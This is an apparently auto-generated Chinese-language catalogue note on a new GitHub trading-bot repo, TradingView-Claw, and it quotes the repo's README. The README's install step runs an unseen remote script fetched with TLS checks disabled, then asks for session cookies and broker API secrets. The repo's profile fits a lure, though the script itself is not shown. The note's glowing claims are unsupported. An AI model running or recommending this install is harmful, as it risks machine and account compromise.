---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 329
stars_per_day: 82
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "AI/ML"
subcategory: "自動化交易"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
use_case: "提供基於技術信號的自動交易功能，讓你輕鬆在 TradingView 上執行交易。"
priority: medium
ring: assess
discovered_via: "GitHub Trending"
verdict: ""
tags:
  - github
  - "category/ai_ml"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供基於技術信號的自動交易功能，讓你輕鬆在 TradingView 上執行交易。"
---

# TradingView-Claw

**329** stars · **82** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 提供基於技術信號的自動交易功能，讓你輕鬆在 TradingView 上執行交易。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (82 stars/day)
> **授權** MIT (商業友好)
> **適合** 希望在 TradingView 上進行自動化交易的量化交易者和金融分析師。
> **一句話重點** 這個專案展示了如何將 LLM 技術應用於自動化交易，並提供即時市場分析。

> [!abstract] 核心創新
> 結合 LLM 的技術分析能力，能夠過濾噪音並提供高信心的交易信號。

## 專案簡介

TradingView-Claw 是一個整合 TradingView 的自動交易工具，使用者可以透過 LLM 驅動的技術分析來執行交易。它的流程包括瀏覽圖表、根據技術信號執行交易、追蹤持倉，並發現交易機會。技術上，它使用 Python 和 Shell 來實現，並透過 API 與交易所進行交互。與其他交易工具相比，TradingView-Claw 的獨特之處在於其信號發現功能，能夠過濾掉噪音，僅保留統計上有意義的信號。使用者可以透過簡單的指令來獲取市場數據、執行交易和追蹤持倉，並且支持多種交易所的 API 整合。這個工具的效能在於能夠快速分析市場趨勢並提供高信心的交易建議。該專案目前處於 beta 階段，適合對自動化交易有興趣的個人或小型團隊使用。建議在資金管理上謹慎使用，特別是在初期測試階段。

**技術棧**：`Python` · `Shell` · `JavaScript`

## 重點功能

- 技術信號執行 — 使用 `tvclaw buy <symbol> <amount>` 和 `tvclaw sell <symbol> <amount>` 指令進行交易。
- 市場數據查詢 — 使用 `tvclaw charts trending` 獲取熱門股票，或 `tvclaw charts search "query"` 查詢特定股票。
- 持倉追蹤 — 使用 `tvclaw positions` 列出所有持倉及其即時盈虧。
- 信號發現 — 使用 `tvclaw signal scan` 掃描市場信號，並可指定查詢主題。
- 帳戶管理 — 使用 `tvclaw account status` 查看帳戶餘額和信息，並使用 `tvclaw account connect` 連接交易所 API。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
在 openclaw.json 中添加 TradingView 和經紀商的 API 金鑰
```
3. 首次設置帳戶連接
```bash
uv run python scripts/tvclaw.py account connect
```

## 程式碼範例

uv run python scripts/tvclaw.py buy AAPL 500

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者 helenigtxu 在開源社群中活躍，過去有多個與交易相關的專案。這個工具解決了市場上缺乏高效自動化交易解決方案的痛點，特別是結合了 LLM 的技術分析能力。近期的討論和需求增加可能促進了這個專案的關注度。隨著自動化交易需求的上升，這個工具的實用性和創新性讓它在當前市場中脫穎而出。

## 適合誰使用

**目標受眾**：希望在 TradingView 上進行自動化交易的量化交易者和金融分析師。

> [!example] 使用場景
> - 量化交易者用它來自動執行基於技術信號的交易，因為可以快速分析市場並做出即時反應，提升交易效率。
> - 新手交易者用它來學習如何根據技術指標進行交易，因為它提供了清晰的指令和即時的市場數據，降低了學習門檻。
> - 資深交易者用它來追蹤多個持倉和市場信號，因為能夠集中管理所有交易資訊，提升決策的準確性。

## 架構分析

TradingView-Claw 採用 CLI 架構，使用者透過命令行介面與系統互動。用戶輸入 → 系統處理 → 返回交易結果。核心技術決策包括使用 LLM 進行技術分析，並透過 API 與交易所進行交互。專案目錄結構中，重要檔案包括 scripts/tvclaw.py，負責主要的交易邏輯和指令處理。

## 技術深入分析

> [!note]- 展開深入分析
> TradingView-Claw 的核心在於其使用 LLM 進行技術分析，這使得它能夠過濾掉市場中的噪音，僅保留有意義的交易信號。效能方面，該工具能夠快速執行交易並提供即時的市場數據，這在高頻交易中尤為重要。設計上，選擇 LLM 而非傳統的技術指標分析，能夠更好地捕捉市場的微妙變化。與其他工具相比，TradingView-Claw 在信號的準確性和即時性上有明顯的優勢，特別是在快速變化的市場環境中。

## 優缺點分析

> [!success] 優點
> - 簡單易用的 CLI 介面，適合快速執行交易。
> - 強大的信號發現功能，能夠提供高信心的交易建議。
> - 支持多種經紀商的 API 整合，靈活性高。

> [!danger] 缺點
> - 僅限於 macOS 使用，對其他操作系統不友好。
> - 需要用戶具備一定的交易知識，否則可能難以有效使用。
> - 尚處於 beta 階段，可能存在不穩定性。

> [!warning] 注意事項
> - 僅支援 macOS 環境安裝。
> - 需要有效的 TradingView 和經紀商 API 金鑰。
> - 不適合完全新手，需具備基本的交易知識。

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 提供多種交易功能，但不具備 LLM 驅動的技術分析能力，適合需要直接與 Binance 進行交互的用戶。 |
| [FreedomIntelligence/OpenClaw-Medical-Skills](https://github.com/FreedomIntelligence/OpenClaw-Medical-Skills) | 專注於醫療領域的技能，與 TradingView-Claw 的金融交易功能無法直接比較，但同樣使用了 OpenClaw 框架。 |

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## 社群與生態

**社群活躍度**：社群活躍度尚可，但缺乏正式的文檔支持。

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompt

## 延伸閱讀

相關概念：[[自動化交易]] · [[量化交易]] · [[API 設計]]

相關專案：[[binance--binance-skills-hub|binance/binance-skills-hub]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[duoan--TorchCode|duoan/TorchCode]] · [[elder-plinius--OBLITERATUS|elder-plinius/OBLITERATUS]] · [[inspatio--worldfm|inspatio/worldfm]] · [[karpathy--autoresearch|karpathy/autoresearch]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "AI/ML" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

---

## 個人筆記

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

### 想法與筆記

_隨時記錄想法、發現、跟其他工具的比較..._
_重點：寫下你的主觀判斷（為什麼好/不好），而不只是功能列表_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
